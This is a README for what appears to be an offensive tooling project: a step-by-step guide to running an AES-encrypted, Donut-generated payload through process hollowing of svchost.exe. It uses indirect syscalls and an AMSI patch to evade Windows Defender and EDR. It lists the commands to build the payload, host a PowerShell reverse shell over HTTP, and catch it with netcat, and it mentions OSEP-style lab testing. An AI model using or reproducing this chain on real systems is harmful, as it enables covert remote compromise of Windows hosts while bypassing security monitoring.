# üß¨ Stealth Shellcode Runner ‚Äì AES + Donut + PowerShell Loader

This project demonstrates a stealthy end-to-end technique to execute an AES-encrypted PowerShell reverse shell using:

- **Process Hollowing**
- **AES-256-CBC Encryption**
- **Donut Shellcode Generator**
- **.NET AMSI Bypass**
- **Indirect Syscalls**
- **PPID Spoofing (not implemented, but supported)**

Tested in OSEP-like environments with **Windows Defender enabled**.

## üß© Step 1: Build the PowerShell Loader

- The C# loader (`Loader.cs`) patches AMSI via `.NET Reflection`, downloads a remote PowerShell payload, and executes it in memory using `Runspace`.
- Uses base64 string obfuscation for script names like `shell.ps1`.

üìå **Important:**  
Make sure the hardcoded IP in `Loader.exe` **matches the IP of the machine hosting `shell.ps1`** via HTTP.

üìå **Note:** You may need to reference:
```
C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Management.Automation.dll
```

---

## üß™ Step 2: Generate Shellcode with Donut

Convert the compiled `Loader.exe` into raw shellcode using [Donut](https://github.com/TheWover/donut):

```bash
donut.exe -i Loader.exe -a 2 -f 1 -b 1 -o shellcode.bin
```

**Explanation of Donut flags:**
- `-a 2`: Target architecture (x64)
- `-f 1`: Output format: raw shellcode
- `-b 1`: AMSI/WLDP/ETW bypass level  
  - `1`: **No bypass**  
  - `2`: Abort on failure  
  - `3`: Continue on failure

üí° *This project uses Donut on Windows and then transfers `shellcode.bin` to a Kali Linux host for encryption.*

---

## üîê Step 3: Encrypt the Shellcode with AES

Use the provided Python script to encrypt the shellcode using AES-256-CBC:

```bash
python3 Aes_encryption.py
```

- The script outputs `encryptedShellcode`, `aesKey`, and `aesIV` as C# byte arrays.
- Paste these into the `Advanced_Process_Hollowing.cs` runner.

---

## üß† Step 4: Execute with Process Hollowing + Indirect Syscalls

The shellcode runner performs the following:

- Creates a suspended process (e.g., `svchost.exe`)
- Allocates memory using `NtAllocateVirtualMemory` (indirect syscall)
- Decrypts the AES shellcode in memory
- Writes shellcode using `NtWriteVirtualMemory` (indirect syscall)
- Sets memory protection to `RX` using `NtProtectVirtualMemory`
- Launches a thread using `NtCreateThreadEx` (indirect syscall)

‚úÖ All syscalls are performed using dynamically allocated stubs from `ntdll.dll`, bypassing userland API hooks from AV/EDR.

‚ùå **PPID Spoofing is not implemented in this version**, although the use of `STARTUPINFOEX` structure means it could be added in the future.

---

## üåê Step 5: Host the PowerShell Reverse Shell

Create a `shell.ps1` PowerShell script containing your reverse shell logic.

üìå **Important:**  
Ensure that the IP inside `shell.ps1` (e.g. `TCPClient('192.168.1.X', 443)`) **matches the IP of your listener machine**.

Then serve the file using Python:

```bash
python3 -m http.server 80
```

---

## üì° Step 6: Start Listener with Netcat

Use `netcat` (and optionally `rlwrap`) to catch the reverse shell:

```bash
rlwrap -cAr nc -lnvp 443
```

---

## üöÄ Step 7: Run the Shellcode Runner

Once everything is set up, run the compiled runner:

```bash
.\Advanced_Process_Hollowing.exe
```

If successful, your listener will receive the reverse shell connection.

---

## ‚úÖ Summary

- AMSI is patched via .NET Reflection
- AES-encrypted shellcode is decrypted and injected into a remote process
- Full execution is achieved via indirect syscalls to evade detection
- The shellcode loads a PowerShell loader that fetches and executes a remote payload
- Designed for stealth and tested in Defender-enabled environments
- PPID Spoofing is not yet implemented, but possible with minimal modification
